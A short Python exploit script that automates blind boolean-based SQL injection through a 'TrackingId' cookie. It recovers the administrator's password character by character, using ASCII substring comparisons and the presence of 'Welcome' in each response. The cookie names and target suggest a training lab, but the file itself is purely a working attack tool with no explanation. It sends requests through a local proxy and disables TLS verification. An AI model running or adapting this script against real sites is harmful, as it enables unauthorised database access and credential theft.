import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    for i in range(1, 21):
        for j in range(32, 126):
            sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i, j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': 'BhCSqHC8Cy0hNWws' + sqli_payload_encoded, 'session': 'Uk57dZwg2U7ptbtDq2SKmrQVyn5ZIkPE'}
            try:
                r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
                if "Welcome" not in r.text:
                    sys.stdout.write('\r' + password_extracted + chr(j))
                    sys.stdout.flush()
                else:
                    password_extracted += chr(j)
                    sys.stdout.write('\r' + password_extracted)
                    sys.stdout.flush()
                    break
            except requests.exceptions.RequestException as e:
                print("(+) An error occurred while sending the request:", e)
                return

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        return

    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    sqli_password(url)

if __name__ == "__main__":
    main()
